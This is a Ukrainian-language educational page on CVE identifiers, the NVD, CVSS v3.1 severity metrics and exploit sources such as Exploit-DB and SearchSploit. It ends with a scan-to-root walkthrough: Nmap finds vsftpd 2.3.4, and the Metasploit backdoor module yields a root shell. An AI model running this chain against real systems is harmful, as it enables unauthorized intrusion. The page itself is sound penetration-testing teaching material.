Система CVE

CVE (Common Vulnerabilities and Exposures) — стандартизована система ідентифікації вразливостей, підтримувана MITRE Corporation з 1999 року. Формат: CVE-YYYY-NNNNN

CVE — Common Vulnerabilities and Exposures

  • Унікальний ID для кожної вразливості
  • Підтримується MITRE Corporation з 1999 року
  • CNA (CVE Numbering Authority) — організації, які присвоюють CVE ID
  • Формат: CVE-рік-номер (CVE-2024-12345)

NVD — National Vulnerability Database

  • База даних NIST, збагачена версія CVE
  • Додає CVSS оцінки критичності
  • CPE (Common Platform Enumeration) — ідентифікатори продуктів
  • Посилання на патчі, експлойти, статті

CVSS Scoring — оцінка критичності

Рівні критичності CVSS v3.1

Рівень Діапазон оцінки Опис
None 0.0 Вразливість відсутня
Low 0.1–3.9 Низька загроза, мінімальний вплив
Medium 4.0–6.9 Середня загроза, можливі обмежені наслідки
High 7.0–8.9 Висока загроза, серйозний вплив на систему
Critical 9.0–10.0 Критична загроза, максимальний ризик

Базові метрики CVSS

  • Attack Vector (AV) — мережевий, сусідній, локальний, фізичний
  • Attack Complexity (AC) — низька чи висока складність експлуатації
  • Privileges Required (PR) — чи потрібна автентифікація
  • User Interaction (UI) — чи потрібна дія користувача
  • Scope (S) — чи змінюється контекст безпеки
  • CIA Impact — вплив на Confidentiality, Integrity, Availability
Приклад: EternalBlue CVE-2017-0144 — CVSS 9.8 Critical (мережевий, без автентифікації, RCE у Windows SMB)

Пошук експлойтів

Exploit-DB

  • exploit-db.com
  • Перевірені експлойти з CVE
  • Google Hacking Database (GHDB)
  • Papers, shellcodes
  • Архів з 1999 року

SearchSploit

  • Офлайн пошук по Exploit-DB
  • CLI інструмент (Kali)
  • searchsploit команда
  • Копіювання експлойтів локально
  • Інтеграція з Nmap

Інші джерела

  • 0day.today — zero-day експлойти
  • PacketStorm — новини + експлойти
  • GitHub — PoC коди
  • Vendor advisories (Microsoft, Cisco)
  • OSVDB (історичні дані)

SearchSploit — основні команди

# Пошук експлойтів для vsftpd 2.3
searchsploit vsftpd 2.3

# Копіювання експлойта в поточний каталог
searchsploit -m 49757

# Пошук за CVE номером
searchsploit --cve 2021-44228

# Інтеграція з результатами Nmap XML
searchsploit --nmap results.xml

Приклад: від сканування до експлуатації

1. Nmap знайшов сервіс

nmap -sV 192.168.1.50
21/tcp open ftp vsftpd 2.3.4

2. Пошук CVE та експлойта

searchsploit vsftpd 2.3.4
vsftpd 2.3.4 - Backdoor Command Execution

3. Metasploit пошук

msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.1.50
msf6 > exploit
Результат: shell отриманий, доступ до системи як root
